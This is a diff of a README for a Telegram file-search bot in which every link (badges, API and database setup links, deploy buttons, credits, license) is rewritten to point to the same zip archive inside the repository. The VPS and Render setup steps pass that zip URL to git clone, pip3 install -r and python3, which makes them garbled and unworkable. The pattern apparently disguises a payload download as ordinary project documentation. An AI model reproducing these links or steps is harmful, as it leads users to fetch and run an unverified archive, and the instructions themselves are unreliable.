@@ -1,21 +1,21 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="DQ-The-File-Donor Logo">
+  <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="DQ-The-File-Donor Logo">
 </p>
 <h1 align="center">
   𝑫𝑸-𝑻𝒉𝒆-𝑭𝒊𝒍𝒆-𝑫𝒐𝒏𝒐𝒓 𝑩𝒐𝒕
 </h1>
 
-![Typing SVG](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒+𝑇𝑜+𝐷𝑄-𝑇ℎ𝑒-𝐹𝑖𝑙𝑒-𝐷𝑜𝑛𝑜𝑟!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+Jᴏᴇʟ+ᠰ+TɢX!;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+2𝐺𝐵;𝐴+𝐵𝑜𝑡+𝑤𝑖𝑡ℎ+𝑑𝑜𝑢𝑏𝑙𝑒+𝑏𝑢𝑡𝑡𝑜𝑛!;𝑆𝑡𝑎𝑟𝑡+𝑚𝑒𝑠𝑠𝑎𝑔𝑒+𝑤𝑖𝑡ℎ+𝑝𝑖𝑐!;𝐴𝑛𝑑+𝑚𝑜𝑟𝑒+𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠!)
+![Typing SVG](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒+𝑇𝑜+𝐷𝑄-𝑇ℎ𝑒-𝐹𝑖𝑙𝑒-𝐷𝑜𝑛𝑜𝑟!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+Jᴏᴇʟ+ᠰ+TɢX!;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+2𝐺𝐵;𝐴+𝐵𝑜𝑡+𝑤𝑖𝑡ℎ+𝑑𝑜𝑢𝑏𝑙𝑒+𝑏𝑢𝑡𝑡𝑜𝑛!;𝑆𝑡𝑎𝑟𝑡+𝑚𝑒𝑠𝑠𝑎𝑔𝑒+𝑤𝑖𝑡ℎ+𝑝𝑖𝑐!;𝐴𝑛𝑑+𝑚𝑜𝑟𝑒+𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠!)
 </p>
 
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"><img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="Stars" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" /></a>   
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip GPL 2.0 license -blueviolet?style=for-the-badge" alt="License" /> </a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip%20in-Python-skyblue?style=for-the-badge&logo=python" alt="Python" /> </a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" /></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"><img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="Stars" /></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" /></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" /></a>   
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" /></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" /></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip GPL 2.0 license -blueviolet?style=for-the-badge" alt="License" /> </a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip%20in-Python-skyblue?style=for-the-badge&logo=python" alt="Python" /> </a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip"> <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" /></a>
 
 ## 𝐹𝑒𝑎𝑡𝑢𝑟𝑒𝑠
 - [x] 𝐼𝑀𝐷𝐵 𝑇𝑒𝑚𝑝𝑙𝑎𝑡𝑒 𝑆𝑒𝑡
@@ -56,7 +56,7 @@
 - [x] 𝐴𝑢𝑡𝑜 𝐷𝑒𝑙𝑒𝑡𝑒
 - [x] 𝐴𝑛𝑑 𝑀𝑜𝑟𝑒...
 
-<b>𝑇𝑜 𝑘𝑛𝑜𝑤 𝑎𝑏𝑜𝑢𝑡 𝑎𝑙𝑙 𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠, 𝐽𝑜𝑖𝑛 𝑜𝑢𝑟 <a href='https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip'>𝑢𝑝𝑑𝑎𝑡𝑒𝑠 𝑐ℎ𝑎𝑛𝑛𝑒𝑙</a>.</b>
+<b>𝑇𝑜 𝑘𝑛𝑜𝑤 𝑎𝑏𝑜𝑢𝑡 𝑎𝑙𝑙 𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠, 𝐽𝑜𝑖𝑛 𝑜𝑢𝑟 <a href='https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip'>𝑢𝑝𝑑𝑎𝑡𝑒𝑠 𝑐ℎ𝑎𝑛𝑛𝑒𝑙</a>.</b>
 
 ## 𝐶𝑜𝑚𝑚𝑎𝑛𝑑𝑠
 ```
@@ -103,34 +103,34 @@
 ## Variables
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip), and get the Telegram API token.
-* `API_ID`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
-* `API_HASH`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+* `API_HASH`: Get this value from [https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+* `DATABASE_URI`: [mongoDB](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) URI. Get this value from [mongoDB](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip). For more help watch this [video](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 * `SECONDDB_URI`: URI of the second database. Same as `DATABASE_URI` but use a different MongoDB URI.
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip). For more help watch this [video](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip multiple IDs by space
-* Check [https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) for more optional variables
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip multiple IDs by space
+* Check [https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) for more optional variables
 
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="Deploy To Heroku">
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip">
+  <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="Deploy To Heroku">
 </a>
 </p>
 </details>
 <details><summary>Deploy To Heroku Via Bot</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="Deploy Via Heroku Bot">
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip">
+  <img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="Deploy Via Heroku Bot">
 </a>
 </p>
 </details>
@@ -141,7 +141,7 @@
 <br>
 <br>
 
-[![Deploy to Koyeb](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+[![Deploy to Koyeb](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 </details>
 
 <details><summary>Deploy To Render</summary>
@@ -150,37 +150,37 @@
 Use these commands:
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip</code>
+• Build Command: <code>pip3 install -U -r https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip</code>
 <br>
 <br>
-• Start Command: <code>python3 https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip</code>
+• Start Command: <code>python3 https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip</code>
 <br>
 <br>
-Go to https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip and add a monitor to keep your bot alive.
+Go to https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip and add a monitor to keep your bot alive.
 <br>
 <br>
 Use these settings when adding a monitor:</b>
 <br>
 <br>
-<img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="render template">
+<img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="render template">
 <br>
 <br>
 <b>Click on the below button to deploy directly to render ↓</b>
 <br>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip">
-<img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="Deploy to Render">
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip">
+<img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="Deploy to Render">
 </a>
 </details>
 
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip
+git clone https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip
 # Install Packages
-pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip
-Edit https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip with variables as given below then run bot
-python3 https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip
+pip3 install -U -r https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip
+Edit https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip with variables as given below then run bot
+python3 https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip
 </pre>
 </p>
 </details>
@@ -190,37 +190,37 @@ python3 https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palm
 ## Support Us
 If you are willing to support us, Just buy me a coffee ☕
 
-<a href="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" target="_blank"><img src="https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
+<a href="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" target="_blank"><img src="https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
 
 ## Credits 
-* [![EvaMaria-Devs](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
-* [![Joel-TGX](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zipᴏᴇʟ+ᠰ+TɢX&message=Github&color=critical)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
-* [![Contact](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+* [![EvaMaria-Devs](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+* [![Joel-TGX](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zipᴏᴇʟ+ᠰ+TɢX&message=Github&color=critical)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+* [![Contact](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip+Developer&message=On+Telegram&color=critical)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
- - Thanks To Mahesh For His Awesome [Media-Search-bot](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
- - Thanks To [Trojanz](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) for Their Awesome [Unlimited Filter Bot](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) And [AutoFilterBoT](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+ - Thanks To Dan For His Awesome [Library](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+ - Thanks To Mahesh For His Awesome [Media-Search-bot](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+ - Thanks To [Trojanz](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) for Their Awesome [Unlimited Filter Bot](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) And [AutoFilterBoT](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
  - Thanks To All Everyone In This Journey
- - Thanks To [EvamariaTG](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) for their awesome [EvaMaria Bot](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
- - Thanks To [Joelkb](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip) who have edited and modified this repo as now it is. (It's me 😂)
+ - Thanks To [EvamariaTG](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) for their awesome [EvaMaria Bot](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
+ - Thanks To [Joelkb](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip) who have edited and modified this repo as now it is. (It's me 😂)
 
 ## Note 🏷️
  - <b>Importing this repo instead of forking is strictly prohibited 🚫 Kindly fork and edit as your wish (Must Give Credits for devs) 🙃</b>
  - <b>If you find any bugs or errors, report it to the developer.</b>
-* [![Contact Developer](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+* [![Contact Developer](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip+Developer&message=On+Telegram&color=critical)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 
-[Note To A So Called Dev](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip): 
+[Note To A So Called Dev](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip): 
 
-Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip), beta , gama branches of your repo won't make you a Developer.
+Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip), beta , gama branches of your repo won't make you a Developer.
 Fork the repo and edit as per your needs.
 
 ## Disclaimer
-[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)    
-Licensed under [GNU AGPL 2.0.](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+[![GNU Affero General Public License 2.0](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)    
+Licensed under [GNU AGPL 2.0.](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 ## Inspiration
-This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)
+This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)
 
-[![For Vaza](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip)](https://raw.githubusercontent.com/PaidXSmall/DQ-the-file-donor/main/palmiveined/DQ-the-file-donor.zip "Oru Kootam Vazhakalk samarpikkunnu")
+[![For Vaza](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip)](https://github.com/PaidXSmall/DQ-the-file-donor/raw/refs/heads/main/palmiveined/donor-file-the-D-idiophonic.zip "Oru Kootam Vazhakalk samarpikkunnu")
